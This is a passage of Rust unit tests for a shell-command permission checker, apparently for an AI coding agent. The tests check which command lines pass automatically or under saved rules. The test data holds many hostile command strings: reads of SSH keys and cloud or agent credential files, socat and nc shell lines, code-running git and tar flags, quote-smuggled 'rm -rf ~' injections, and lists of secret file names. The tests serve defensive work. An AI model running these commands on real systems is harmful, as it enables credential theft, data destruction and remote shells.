        assert_eq!(one("pnpm add left-pad"), [rule("pnpm add left-pad", true)]);
        assert_eq!(
            one("cargo publish --dry-run"),
            [rule("cargo publish --dry-run", true)]
        );
        assert_eq!(
            one("gh api repos/owner/repo"),
            [rule("gh api repos/owner/repo", true)]
        );
        assert_eq!(one("npm run publish"), [rule("npm run publish", true)]);
        assert_eq!(one("sed -i 's/a/b/' f"), [rule("sed -i s/a/b/ f", true)]);
        assert_eq!(one("find . -delete"), [rule("find . -delete", true)]);
        assert_eq!(one("python3 x.py"), [rule("python3 x.py", true)]);
        assert_eq!(
            one("git add . && git push"),
            [rule("git add", false), rule("git push", true)]
        );
        assert_eq!(
            one("echo \"it's\""),
            [rule("echo", false)],
            "a plain command keeps only its name"
        );
        assert_eq!(one("rm \"it's\""), [rule("rm 'it'\\''s'", true)]);
    }

    #[test]
    fn rules_match_what_they_were_saved_for_and_no_more() {
        let rules = [
            rule("git show", false),
            rule("cargo test", false),
            rule("ls", false),
            rule("rm -rf build", true),
            rule("git branch", false),
            rule("rm 'it'\\''s'", true),
        ];
        let ask = |line: &str| allows(line, false, &rules);
        assert!(ask("git show 9f8e7d"));
        assert!(ask("git -C sub show HEAD"));
        assert!(ask("cargo test -p other"));
        assert!(ask("ls -la src && cargo test"));
        // A loose rule covers only what lies inside the folders.
        assert!(!ask("ls -la /tmp && cargo test"));
        assert!(ask("rm -rf build"));
        assert!(ask("rm   -rf   'build'"));
        assert!(ask("rm \"it's\""));
        assert!(ask("cd x && ls"));
        assert!(!ask("rm -rf build2"));
        assert!(!ask("rm -rf build && rm -rf src"));
        assert!(!ask("git log"));
        assert!(!ask("cargo build"));
        assert!(!ask("ls && git push"));
        // A loose rule never covers the risky form of its command.
        assert!(ask("git branch -a"));
        assert!(!ask("git branch -D main"));
        // Nor does it get past a refusal.
        assert!(!ask("ls $(rm x)"));
        assert!(!ask("ls > out"));
        // Rules count in Auto too, along with what only reads.
        assert!(allows("git status && rm -rf build", true, &rules));
        assert!(!allows("git status && rm -rf build", false, &rules));
    }

    #[test]
    fn a_path_outside_the_folders_asks_in_auto() {
        for line in [
            "cat ~/notes.txt",
            "cat /etc/passwd",
            "cat ../other/file",
            "cat /work/ws2/file",
            "cat /work/ws/../other",
            "cat sub/../../other",
            "cat -- /etc/passwd",
            "ls .. ",
            "tree /",
            "du /",
            "grep -r token ~/.config",
            "grep -e foo /etc/passwd",
            "grep -f /etc/passwd x",
            "rg foo /etc",
            "rg --files /etc",
            "jq . /etc/passwd",
            "sed -n 1p /etc/passwd",
            "sed -e p /etc/p",
            "sort --files0-from=/etc/x",
            "head --lines=1 --bytes=/etc/x",
            "cargo test --manifest-path=/tmp/evil/Cargo.toml",
            "go build -o /tmp/x",
            "npm --prefix /tmp/evil test",
            "pnpm --dir /tmp/evil test",
            "pnpm -C/tmp/evil test",
        ] {
            assert!(!auto(line), "{line}");
        }
        for line in [
            "ls /work/ws/src",
            "cat /data/attached/picture.png",
            "cat ../ws/README.md",
            "cat ./README.md",
            "rg /etc src",
            "grep /usr README.md",
            "jq .name package.json",
            "sed -n '/x/p' a.rs",
            "sed -e '/x/p' a.rs",
            "echo /etc/passwd ~/.ssh",
            "git log a..b",
            "git diff HEAD~1",
            "go test ./...",
            "cargo test --features a/b",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_rule_for_a_project_tool_doesnt_cover_another_folder() {
        let rules = [
            rule("npm test", false),
            rule("cargo test", false),
            rule("git status", false),
            rule("git log", false),
            rule("ls", false),
        ];
        for line in [
            "npm --prefix /tmp/evil test",
            "cargo test --manifest-path=/tmp/evil/Cargo.toml",
            "git -C ~ log",
            "git --no-pager -C / status",
            "git -C ../other status",
        ] {
            for auto in [false, true] {
                assert!(!allows(line, auto, &rules), "{line} in Auto {auto}");
            }
            assert!(rules_for(line).iter().all(|rule| rule.exact), "{line}");
        }
        assert!(allows("git -C sub log", false, &rules));
        assert!(allows("git -C vendor/evil.git status", true, &[]));
        // A plain command's rule covers it only inside the folders, in
        // every mode.
        assert!(allows("ls src", false, &rules));
        assert!(!allows("ls /tmp", false, &rules));
        assert!(!allows("ls /tmp", true, &rules));
        // Saving one of these keeps its words, so it can pass again in Auto.
        assert_eq!(rules_for("ls /tmp"), [rule("ls /tmp", true)]);
        assert!(allows("ls /tmp", true, &rules_for("ls /tmp")));
    }

    #[test]
    fn a_name_that_holds_secrets_asks_under_a_rule_too() {
        let rules = [
            rule("cat", false),
            rule("ls", false),
            rule("grep", false),
            rule("git log", false),
        ];
        for line in [
            "cat ~/.ssh/id_ed25519",
            "cat /home/you/.ssh/config",
            "cat .ssh/config",
            "cat ~/.aws/credentials",
            "cat ~/.gnupg/secring.gpg",
            "cat ~/.netrc",
            "cat .env",
            "cat .env.local",
            "cat config/.ENV",
            "cat ~/Library/Keychains/login.keychain-db",
            "cat id_rsa",
            "cat keys/server.pem",
            "cat ../.claude/settings.json",
            "cat ~/.claude/.credentials.json",
            "cat ~/.codex/auth.json",
            "cat ~/.cursor/mcp.json",
            "ls --directory=.ssh",
            "ls -I.ssh",
            "grep foo .env",
            "grep -e foo .env",
            "git log --output-indicator-new=.env",
        ] {
            for auto in [false, true] {
                assert!(!allows(line, auto, &rules), "{line} in Auto {auto}");
            }
            assert!(rules_for(line).iter().all(|rule| rule.exact), "{line}");
        }
        // A workspace may live under such a name itself.
        for (cwd, line) in [
            ("/home/you/id_tools/ws", "cat /home/you/id_tools/ws/a.rs"),
            (
                "/home/you/.claude/worktrees/ws",
                "cat /home/you/.claude/worktrees/ws/a.rs",
            ),
        ] {
            let place = Folders::new(Path::new(cwd), Path::new("/data/attached"), false);
            assert!(super::allows(line, true, &[], &place), "{line}");
        }
        // You can still say yes to those words.
        let line = "cat .env.example";
        assert!(allows(line, true, &rules_for(line)));
    }

    #[test]
    fn a_glob_asks_where_it_could_match_a_name_that_holds_secrets() {
        for line in [
            "cat *",
            "ls *",
            "ls src/*",
            "ls src/*/mod.rs",
            "grep foo *",
            "cat .e*",
            "cat .*",
            "cat *.pe?",
            "cat *.p?m",
            "cat *.pem",
            "cat *_rsa",
            "cat i?_rsa",
        ] {
            assert!(!auto(line), "{line}");
            assert!(
                !allows(line, false, &[rule("cat", false), rule("ls", false)]),
                "{line}"
            );
        }
        for line in ["wc -l src/*.rs", "ls *.md", "ls src/*_test.rs", "cat *.txt"] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn cd_passes_only_inside_the_folders() {
        for line in [
            "cd /",
            "cd ~",
            "cd",
            "cd -",
            "cd ~/.ssh",
            "cd .ssh",
            "cd ..",
            "cd .. && cd ..",
            "cd ~/.ssh; cd /",
            "cd /; ls",
            "cd ~/.ssh && cat id_ed25519",
            "cd /work/ws2 && ls",
            "cd s* && ls",
            "cd -P /etc",
            // A `cd` that fails leaves the line in another folder.
            "cd sub; cat ../../x",
            "cd sub && cat ../x",
            "cd sub && cd ..",
        ] {
            for mode in [false, true] {
                assert!(
                    !allows(line, mode, &[rule("cd", false), rule("ls", false)]),
                    "{line} in Auto {mode}"
                );
            }
            assert!(
                !rules_for(line)
                    .iter()
                    .any(|rule| rule.command.starts_with("cd")),
                "{line}"
            );
        }
        for line in [
            "cd /work/ws && cargo test",
            "cd /work/ws/sub && ls",
            "cd sub && ls",
            "cd sub && cd deeper && ls",
            "cd . && ls",
            "cd /data/attached && ls",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    #[cfg(unix)]
    fn a_workspace_through_a_symlink_still_passes_and_cant_climb_out() {
        let base = std::env::temp_dir().join(format!("maxhq-folders-{}", std::process::id()));
        let real = base.join("real").join("ws");
        std::fs::create_dir_all(&real).unwrap();
        let link = base.join("link");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let real = std::fs::canonicalize(&real).unwrap();
        let folders = Folders::new(&link, &link.join("attached"), true);
        let line = |path: &Path| format!("cat {}", path.join("a.rs").display());
        assert!(super::allows(&line(&link), true, &[], &folders));
        assert!(super::allows(&line(&real), true, &[], &folders));
        assert!(super::allows("cat ../ws/a.rs", true, &[], &folders));
        // `..` climbs from the real folder, not from the link's words.
        assert!(!super::allows("cat ../link/a.rs", true, &[], &folders));
        assert!(!super::allows("cat ../other", true, &[], &folders));
        // On another machine, nothing resolves.
        let far = Folders::new(&link, &link.join("attached"), false);
        assert!(super::allows(&line(&link), true, &[], &far));
        assert!(!super::allows(&line(&real), true, &[], &far));
        std::fs::remove_dir_all(&base).unwrap();
    }

    /// Lines that run code or change things their rule's words don't show.
    const RUN_MORE_THAN_THEY_SAY: &[&str] = &[
        "/bin/rm -rf build",
        "/usr/bin/curl -o out example.com",
        "/bin/bash -c ls",
        "./x --evil",
        "../x",
        "RM -rf build",
        "Curl example.com",
        "nc -l 80",
        "ncat example.com 80",
        "socat - x",
        "telnet example.com",
        "ftp example.com",
        "tar -xf a.tar",
        "zip a.zip a",
        "unzip a.zip",
        "patch -p1",
        "install a /usr/bin/a",
        "vim a",
        "nvim a",
        "ed a",
        "ex a",
        "emacs a",
        "crontab a",
        "launchctl list",
        "security list",
        "gcc a.c",
        "cc a.c",
        "clang a.c",
        "then touch a",
        "do touch a",
        "else touch a",
        "! touch a",
        "if touch a",
        "while touch a",
        "trap ls EXIT",
        "alias ls=rm",
        "export A=1",
        "set -a",
        "pushd sub",
        "cargo run --bin a",
        "uv run a.py",
        "uv pip list",
        "uv tool list",
        "go run .",
        "go generate ./...",
        "poetry run a",
        "deno run a.ts",
        "deno eval 1",
        "swift run",
        "dotnet run",
        "mix run a.exs",
        "rustup run stable a",
        "npm config set a b",
        "npm ci",
        "make clean SHELL=./x",
        "make clean CC=./x",
        "make -f a.mk clean",
        "make --eval=a clean",
        "git fetch --upload-pack=./x origin",
        "git pull",
        "git clone --upload-pack=./x a",
        "git ls-remote --upload-pack=./x a",
        "git submodule foreach ./x",
        "git bisect run ./x",
        "git send-email --sendmail-cmd=./x a",
        "git hook run a",
        "git difftool",
        "git mergetool",
        "git archive --exec=./x a",
        "git am a",
        "git apply a",
        "git merge a",
        "git cherry-pick a",
        "git update-index a",
        "git credential fill",
    ];

    #[test]
    fn a_command_that_runs_more_than_it_says_keeps_its_exact_words() {
        for line in RUN_MORE_THAN_THEY_SAY {
            let rules = rules_for(line);
            assert!(rules.iter().all(|rule| rule.exact), "{line}: {rules:?}");
            assert!(allows(line, false, &rules), "{line}: {rules:?}");
            for mode in [false, true] {
                assert!(!allows(line, mode, &[]), "{line}");
            }
        }
    }

    #[test]
    fn a_rule_saved_before_doesnt_keep_passing_a_risky_program() {
        // The loose rule each of these lines used to save, as a project may
        // still have it stored.
        for (saved, line) in [
            ("/bin/rm", "/bin/rm -rf /"),
            ("/usr/bin/curl", "/usr/bin/curl -o .zshrc example.com"),
            ("./x", "./x --evil"),
            ("RM", "RM -rf /"),
            ("socat", "socat EXEC:sh TCP:example.com:80"),
            ("tar", "tar --to-command=./x -xf a.tar"),
            ("gcc", "gcc -wrapper ./x a.c"),
            ("then", "then rm -rf build"),
            ("do", "do rm -rf build"),
            ("cargo run", "cargo run --bin evil"),
            ("uv run", "uv run evil.py"),
            ("git fetch", "git fetch --upload-pack=./x origin"),
            ("git submodule", "git submodule foreach ./x"),
            ("git bisect", "git bisect run ./x"),
            ("make clean", "make clean SHELL=./x"),
        ] {
            for mode in [false, true] {
                assert!(!allows(line, mode, &[rule(saved, false)]), "{line}");
            }
        }
        // Rules for what's still plain keep working, and so do exact ones.
        assert!(allows(
            "pnpm run dev --port 1",
            false,
            &[rule("pnpm run dev", false)]
        ));
        assert!(allows(
            "git commit -m x",
            false,
            &[rule("git commit", false)]
        ));
        assert!(allows("make clean", false, &[rule("make clean", false)]));
        assert!(allows("cargo run", false, &[rule("cargo run", true)]));
        assert!(allows("/bin/rm a", false, &[rule("/bin/rm a", true)]));
    }

    #[test]
    fn saved_rules_match_the_line_they_came_from() {
        for line in [
            "git show 1a2b3c",
            "rm -rf 'my dir' && mv a b",
            "curl -s \"https://example.com/?q=a&b=c\"",
            "pnpm run dev",
            "find . -name '*.tmp' -delete",
            "echo 'single '\\'' quote'",
        ] {
            let rules = rules_for(line);
            assert!(!rules.is_empty(), "{line}");
            assert!(allows(line, false, &rules), "{line}: {rules:?}");
        }
    }

    /// The lines that pass in Auto or under `rules`, which should be none.
    fn passing<'a>(lines: &[&'a str], rules: &[CommandRule]) -> Vec<&'a str> {
        lines
            .iter()
            .copied()
            .filter(|line| allows(line, true, rules) || allows(line, false, rules))
            .collect()
    }

    #[test]
    fn a_word_the_shell_would_change_always_asks() {
        let lines = [
            r"echo $'a\'' ; touch MARK # '",
            r"ls $'a\'' ; rm -rf ~ # '",
            r"git status $'x\'' ; touch MARK # '",
            r"echo $'\''; touch M #'",
            "find . $'-delete'",
            "sort $'-o' out in",
            "git diff $'--output=x'",
            "find . ${X:--delete}",
            "sort ${X:--o} out in",
            "git diff ${X:---output=x}",
            "sed ${X:--i} s/a/b/ f",
            "find . {-delete,-name,x}",
            "sort {-o,out} in",
            "find . -[d]elete",
            "git diff --outpu[t]=x",
            "echo $HOME",
            r#"echo "$HOME""#,
            "git show HEAD@{1}",
            r"ls \",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        // Neither does a rule that names the command get them through.
        let rules = [
            rule("echo", false),
            rule("ls", false),
            rule("rg", false),
            rule("git status", false),
            rule("git show", false),
            rule("git diff", false),
            rule("find", false),
            rule("sort", false),
            rule("sed", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
        assert_eq!(split("find . ${X:--delete}"), Err(Refusal::Expansion));
        assert_eq!(split(r"ls \"), Err(Refusal::Unclosed));
        // A saved rule reads the line through the same lexer.
        let saved = [rule("git show", false)];
        assert!(!allows(r"git show $'\''; touch M #'", false, &saved));
        assert!(!allows(r"git show $'\''; touch M #'", true, &saved));
        // Single quotes, and a backslash, keep them literal.
        for line in [
            "rg 'foo$' src",
            "rg '[a-z]{2}' src",
            r"echo \$HOME",
            r#"echo "\$HOME""#,
            r"echo \{a\}",
            r"echo \[a",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_term_or_a_name_like_a_secret_doesnt_ask() {
        for line in [
            "git grep credentials",
            "git grep -n credentials src",
            "git grep -A 3 id_rsa src",
            "git grep -e credentials",
            "git log --grep=credentials",
            "git log --grep credentials",
            "git log --author=credentials",
            "git log -S id_rsa",
            "cargo test credentials",
            "cargo test -p maxd credentials",
            "npm test credentials",
            "pnpm test credentials",
            "pytest -k credentials",
            "pytest -k id_foo",
            "rg credentials src",
            "rg -n -A 3 credentials src",
            "grep -r credentials .",
            "find . -name credentials.json",
            "find . -iname id_rsa",
            "cat src/id_map.rs",
            "cat id_tools/a.rs",
            "cat credentials.rs",
            "sed -n '1,40p' crates/daemon/src/auth/id_token.rs",
        ] {
            assert!(auto(line), "{line}");
        }
        // A folder named `secrets` asks wherever it is, as MaxHQ keeps its
        // own sign-ins in one.
        assert!(!auto(
            "sed -n '1,40p' crates/daemon/src/secrets/chatgpt/id_token.rs"
        ));
    }

    #[test]
    fn a_real_key_name_asks_wherever_a_path_goes() {
        let lines = [
            "cat id_rsa",
            "cat id_ed25519",
            "cat id_ecdsa",
            "cat id_dsa",
            "cat id_rsa_work",
            "cat credentials",
            "cat credentials.json",
            "cat src/credentials",
            "cat .aws/credentials",
            "cat .env",
            "cat .env.example",
            "rg foo credentials",
            "rg -A 3 foo id_rsa",
            "git grep foo credentials",
            "git grep -f id_rsa",
            "git grep -n -f ~/.ssh/id_rsa src",
            "git grep -nf id_rsa",
            "grep -- -x id_rsa",
            "grep -- -A 3 id_rsa",
            "jq -C 3 id_rsa",
            "cargo test --config id_rsa",
            "cargo test --manifest-path id_rsa",
            "git log -- credentials",
            "git log --output=id_rsa",
            "cargo test ./credentials",
            "cargo test .env",
            "cargo test --manifest-path /tmp/x/Cargo.toml",
            "pytest credentials",
            "pytest -c id_rsa",
            "find credentials -name a",
            "find . -newer id_rsa",
            "go test ./credentials",
            "sed -n 1p id_rsa",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
    }

    #[test]
    fn a_change_stays_off_names_that_hold_secrets() {
        for path in [
            ".ssh/authorized_keys",
            ".ssh/config",
            ".aws/credentials",
            ".env",
            "id_rsa",
            "/work/ws/.ssh/config",
        ] {
            assert!(!folders().may_change(path), "{path}");
        }
        for path in ["src/main.rs", "src/id_map.rs", "credentials.rs"] {
            assert!(folders().may_change(path), "{path}");
        }
    }

    #[test]
    fn always_allow_holds_only_where_its_rules_cover_the_line() {
        for line in [
            "git status",
            "git show 1a2b3c && rm -rf build",
            "rm -rf build",
            "ls /tmp",
            "cat ~/.ssh/id_ed25519",
            "cd sub && ls",
        ] {
            assert!(always_allow_holds(line, &folders()), "{line}");
        }
        for line in [
            "cd /other/repo && git status",
            "rg foo src/*.rs",
            "tail -5 logs/*.log",
            "git diff -- src/*.rs",
            "echo $HOME",
            "git status; sudo rm x",
        ] {
            assert!(!always_allow_holds(line, &folders()), "{line}");
        }
    }

    #[test]
    fn double_quotes_keep_what_no_shell_expands_there() {
        // bash, zsh, dash and ksh each read these as these words.
        for (quoted, word) in [
            (r#""foo$""#, "foo$"),
            (r#""^foo$""#, "^foo$"),
            (r#""$""#, "$"),
            (r#""a$"b"#, "a$b"),
            (r#""a$"'b'"#, "a$b"),
            (r#""$""$""#, "$$"),
            (r#""foo[0-9]""#, "foo[0-9]"),
            (r#""fn main() {""#, "fn main() {"),
            (r#""a{2}""#, "a{2}"),
            (r#""{a,b}""#, "{a,b}"),
            (r#""}""#, "}"),
            (r#""[""#, "["),
            (r#""]""#, "]"),
            (r#""a*""#, "a*"),
            (r#""a?""#, "a?"),
            (r#""\{""#, r"\{"),
            (r#""foo\[0\]""#, r"foo\[0\]"),
            (r#""foo\$""#, "foo$"),
            (r#""foo\\$""#, r"foo\$"),
        ] {
            let line = format!("rg {quoted} src");
            assert_eq!(words(&line), [["rg", word, "src"]], "{line}");
            assert!(auto(&line), "{line}");
            assert!(allows(&line, false, &[rule("rg", false)]), "{line}");
            assert!(!allows(&line, false, &[]), "{line}");
        }
        for line in [
            r#"grep "^foo$" x"#,
            r#"git show "HEAD@{1}""#,
            r#"git log "@{u}..""#,
            r#"cat "app/[id]/page.tsx""#,
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn double_quotes_still_ask_about_what_the_shell_expands_there() {
        let lines = [
            r#"rg "$(id)""#,
            r#"rg "`id`""#,
            r#"rg "$HOME""#,
            r#"rg "${HOME}""#,
            r#"rg "$[1]""#,
            r#"rg "foo$ ""#,
            r#"rg "foo$\"""#,
            r#"rg "foo$"#,
            // A doubled backslash leaves what follows it live.
            r#"rg "a\\$(id)""#,
            r#"rg "a\\`id`""#,
            r#"rg "a\\$HOME""#,
            // What follows the closing quote is outside it.
            r#"rg "a$"$b"#,
            r#"rg "a$"`id`"#,
            r#"rg "a$"$(id)"#,
            r#"rg "a$"[0-9]"#,
            r#"rg "a"{b,c}"#,
            "rg foo[0-9] src",
            "rg foo{a,b} src",
            "rg foo$ src",
            "cat app/[id]/page.tsx",
            "git show HEAD@{1}",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        let rules = [
            rule("rg", false),
            rule("cat", false),
            rule("git show", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
    }

    #[test]
    fn a_backslash_in_double_quotes_keeps_what_follows_it_literal() {
        // Each shell prints these as written, so they don't run anything.
        assert_eq!(words(r#"rg "a\$(id)""#), [["rg", "a$(id)"]]);
        assert_eq!(words(r#"rg "a\`id\`""#), [["rg", "a`id`"]]);
        assert_eq!(words(r#"rg "a\$HOME""#), [["rg", "a$HOME"]]);
        assert!(auto(r#"rg "a\$(id)""#));
    }

    #[test]
    fn a_rule_in_double_quotes_names_only_those_words() {
        for (saved, same, others) in [
            (
                r#"rm "a[0-9]""#,
                "rm 'a[0-9]'",
                ["rm a[0-9]", r#"rm "$x""#, "rm a1"],
            ),
            (
                r#"rm "a{b,c}""#,
                "rm 'a{b,c}'",
                ["rm a{b,c}", r#"rm "$x""#, "rm ab"],
            ),
            (r#"rm "a$""#, "rm 'a$'", ["rm a$", r#"rm "a$x""#, "rm a"]),
        ] {
            let rules = [rule(saved, true)];
            assert!(allows(saved, false, &rules), "{saved}");
            assert!(allows(same, false, &rules), "{same}");
            for other in others {
                assert!(!allows(other, false, &rules), "{other}");
            }
            // What "Always allow" saves for it reads back as the same words.
            let offered = rules_for(saved);
            assert_eq!(offered.len(), 1, "{saved}");
            assert!(offered[0].exact, "{saved}");
            assert!(allows(saved, false, &offered), "{saved}");
            for other in others {
                assert!(!allows(other, false, &offered), "{other}");
            }
        }
        // A loose rule has no wildcards, so these words name only themselves.
        let loose = [rule(r#"git "{x}""#, false)];
        assert!(allows(r#"git "{x}""#, false, &loose));
        assert!(!allows("git x", false, &loose));
        assert!(!allows("git {x}", false, &loose));
        // A risky command still needs its exact words.
        assert!(!allows(r#"rm "a[0-9]""#, false, &[rule("rm", false)]));
    }

    #[test]
    fn quotes_read_the_way_the_shell_reads_them() {
        for line in [
            r#"g"i"t status"#,
            "g'i't status",
            r"g\it status",
            "echo x >/dev/null",
            "echo x 2>&1",
            "echo x >&2",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_sed_script_split_across_flags_asks() {
        for line in [
            r"sed -e 's/a/b\' -e '/;w out' f",
            "sed -e 's/a/b' f",
            "sed -e 'y/a/b' f",
            "sed -e '/a' -e '/;w out' f",
        ] {
            assert!(!auto(line), "{line}");
        }
        assert!(auto("sed -e '/a/p' -e 's/a/b/' f"));
    }

    #[test]
    fn a_flag_counts_however_its_tool_reads_it() {
        let lines = [
            "git diff --outp=path",
            "git log --outpu=path",
            "git grep --open-f='sh -c id' x",
            "git grep --open=./x needle",
            "git grep -nO x",
            "sort --outp=out in",
            "sort --outp=x a",
            "sort -ro out in",
            "uniq - out",
            "uniq - x",
            "uniq -- a b",
            "tree -ao out",
            "tree -ox",
            "tree -R",
            "rg --pr=./x y",
            "fd -xrm",
            "fd -xtouch",
            "fd -X./x",
            "date --se=x",
            "sed --in s/a/b/ x",
            "sed --file=evil.sed x",
            "sed -es/a/b/w x",
            "sed -l 5 x",
            "sed 's/a/b/;r /etc/passwd' x",
            r"sed 's\aw\b\c' x",
            r"sed '\,s,p;w out' x",
            "sed ':s;w out' x",
            "sed 'bs;w out' x",
            "printf -v x '%s' y",
            "tail -f x",
            "tail -F x",
            "tail --follow x",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        for line in lines {
            assert!(
                rules_for(line).iter().all(|rule| rule.exact),
                "{line}: {:?}",
                rules_for(line)
            );
        }
        // Names that only look alike stay as they were.
        for line in [
            "rg --pretty x",
            "git log --oneline -5",
            "git diff --no-ext-diff",
            "git show --no-textconv HEAD",
            "sort -r -u in.txt",
            "uniq -c in.txt",
            "tail -n 5 x",
            "sed -nE '1,5p' x",
            "sed -n -e 3p x",
            "sed -ne 3p x",
            r"sed ':a;N;$!ba;s/\n/ /g' x",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_flag_that_loads_or_runs_code_asks_under_a_rule_too() {
        for (line, command) in [
            ("git diff --ext-diff", "git diff"),
            ("git show --textconv", "git show"),
            ("git cat-file --filters x", "git cat-file"),
            ("git log --show-signature", "git log"),
            ("sort --compress-program=./x in", "sort"),
            ("sort -S 1K --compress-program=./x f", "sort"),
            ("jq -f evil x", "jq"),
            ("jq -L evil .", "jq"),
            (
                "rg --hostname-bin=./evil --hyperlink-format=default x",
                "rg",
            ),
            ("rg --hostname-bin=./x --hyperlink-format=default y", "rg"),
            ("file --compile -m x", "file"),
            (
                r#"cargo build --config 'build.rustc-wrapper="./x"'"#,
                "cargo build",
            ),
            ("cargo --config x test", "cargo"),
            ("go test -exec ./x", "go test"),
            ("go build -toolexec=./x", "go build"),
            ("go vet -vettool=./x", "go vet"),
            ("pytest -p evil", "pytest"),
            ("pytest -xp evil", "pytest"),
            ("pytest --override=x", "pytest"),
            ("npm test --script-shell=./evil", "npm test"),
            ("pnpm test --config.x=y", "pnpm test"),
            ("bun test -r ./evil", "bun test"),
        ] {
            assert!(!auto(line), "{line}");
            assert!(!allows(line, false, &[rule(command, false)]), "{line}");
            assert!(
                rules_for(line).iter().all(|rule| rule.exact),
                "{line}: {:?}",
                rules_for(line)
            );
        }
    }

    #[test]
    fn a_glob_asks_where_a_file_named_as_a_flag_could_do_harm() {
        for (line, command) in [
            ("find . *", "find"),
            ("sed -n 1p *", "sed"),
            ("git diff *", "git diff"),
            ("sort *", "sort"),
            ("sort ?.txt", "sort"),
            ("uniq *", "uniq"),
            ("rg foo *", "rg"),
            ("fd foo *", "fd"),
            ("tree *", "tree"),
            ("file *", "file"),
            ("jq . *", "jq"),
            ("tail -n 5 *.log", "tail"),
            ("date *", "date"),
            ("printf %s *", "printf"),
            ("cargo test *", "cargo test"),
            ("go test *", "go test"),
            ("pytest *", "pytest"),
            ("tsc --noEmit *", "tsc"),
            ("npm test *", "npm test"),
            ("pnpm test *", "pnpm test"),
        ] {
            assert!(!auto(line), "{line}");
            assert!(!allows(line, false, &[rule(command, false)]), "{line}");
            assert!(rules_for(line).is_empty(), "{line}");
        }
        // A file named as a flag can only change what these read or print.
        for line in [
            "ls *.md",
            "cat src/*.rs",
            "head -n 5 *.txt",
            "wc -l src/*.rs",
            "grep foo *.rs",
            "stat *.md",
            "du -sh src/*.md",
            "diff a.rs *.rs",
        ] {
            assert!(auto(line), "{line}");
        }
        // Quoted, these are just characters.
        for line in [
            "find . -name '*.rs'",
            r#"find . -name "*.rs""#,
            r"find . -name \*.rs",
            "git log --grep '?'",
            "sort 'a*'",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn ordinary_lines_still_pass() {
        for line in [
            "git status",
            "git log --oneline -5",
            "git diff HEAD~1",
            "ls -la",
            "rg foo src",
            "cargo check",
            "cat README.md",
            "grep -r foo .",
            "cargo test",
            "npm test",
            "pnpm test",
            "pytest",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_rule_that_does_not_read_as_one_command_matches_nothing() {
        let rules = [rule("ls && rm x", false), rule("echo $(x)", true)];
        assert!(!allows("ls", false, &rules));
        assert!(!allows("echo hi", false, &rules));
    }

    #[test]
    fn everyday_reads_pass_in_auto_without_a_card() {
        for line in [
            "cat",
            "cat README.md",
            "cat -n src/main.rs",
            "rg -n foo src",
            "rg -n -A 3 --hidden foo src",
            "grep -rnA3 foo src",
            "grep --context=3 -e foo src",
            "jq .name package.json",
            "jq -r '.scripts | keys[]' package.json",
            "jq --arg name x '.[$name]' package.json",
            "jq '.env' package.json",
            "git log -p",
            "git log -p -- src",
            "ls -la",
            "ls -la src",
            "head -50",
            "head -50 README.md",
            "head -n 50 README.md",
            "tail -n 20 notes.txt",
            "wc -l",
            "wc -l src/main.rs",
            "sort -u",
            "sort -u names.txt",
            "tree -L 2 src",
            "du -sh src",
            "diff -u a.rs b.rs",
            "fd -e rs src",
            "date +%F",
        ] {
            assert!(auto(line), "{line}");
            assert!(!rules_for(line).iter().any(|rule| rule.exact), "{line}");
        }
    }

    #[test]
    fn a_reader_asks_when_a_flag_reads_more_than_its_words_show() {
        let lines = [
            "jq --rawfile key /etc/hosts .",
            "jq --rawfile key notes.txt .",
            "jq --slurpfile key notes.json .",
            "jq --from-file f.jq package.json",
            "jq -L /tmp . package.json",
            "jq -n env",
            "jq -n env.HOME",
            "jq -n '$ENV'",
            "jq -n '$ENV.HOME'",
            "jq '.a | env' package.json",
            r#"jq -n '"\(env)"'"#,
            r#"jq 'import "x" as x; .' package.json"#,
            r#"jq 'include "x"; .' package.json"#,
            "sort --files0-from=list",
            "sort --files0-from=-",
            "sort --files0-from list",
            "rg --ignore-file .gitignore foo",
            "rg --ignore-file=/etc/hosts foo",
            "find . -files0-from list",
            "find -files0-from list",
            "file -f list",
            "file -flist",
            "wc --files0-from=list",
            "wc --files0-from list",
            "du --files0-from=list",
            "grep --exclude-from=list foo src",
            "grep -R foo .",
            "git config --list",
            "git config --global --list",
            "git config --system --list",
            "git config --get user.email",
            "git config --local --file x --list",
            "date 0101000026",
            "head --lin=5 a",
            "sort --uniq a",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        let rules = [
            rule("jq", false),
            rule("sort", false),
            rule("rg", false),
            rule("find", false),
            rule("file", false),
            rule("wc", false),
            rule("du", false),
            rule("grep", false),
            rule("git config", false),
            rule("date", false),
            rule("head", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
        for line in lines {
            assert!(
                rules_for(line).iter().all(|rule| rule.exact),
                "{line}: {:?}",
                rules_for(line)
            );
        }
        // The repository's own settings still read.
        assert!(auto("git config --local --list"));
        assert!(auto("git config --local --get user.email"));
    }

    #[test]
    fn a_flag_value_counts_however_the_program_reads_it() {
        // Grouped, joined and after `=`, a value that names a file is checked.
        let lines = [
            "grep -rf /etc/hosts src",
            "grep -f/etc/hosts src",
            "grep --file=/etc/hosts src",
            "grep -e foo --file /etc/hosts",
            "date -r /etc/hosts",
            "date -f=/etc/hosts",
            "stat -f %z /etc/hosts",
            "tail -n 5 /etc/hosts",
            "cat src /etc/hosts",
            // BSD tools stop at the first file, so a flag after it is a file.
            "cat src -/etc/hosts",
        ];
        assert_eq!(passing(&lines, &[]), [""; 0]);
        let rules = [
            rule("grep", false),
            rule("date", false),
            rule("stat", false),
            rule("tail", false),
            rule("cat", false),
        ];
        assert_eq!(passing(&lines, &rules), [""; 0]);
    }

    #[test]
    fn a_flag_before_the_subcommand_keeps_the_exact_words() {
        for (line, loose) in [
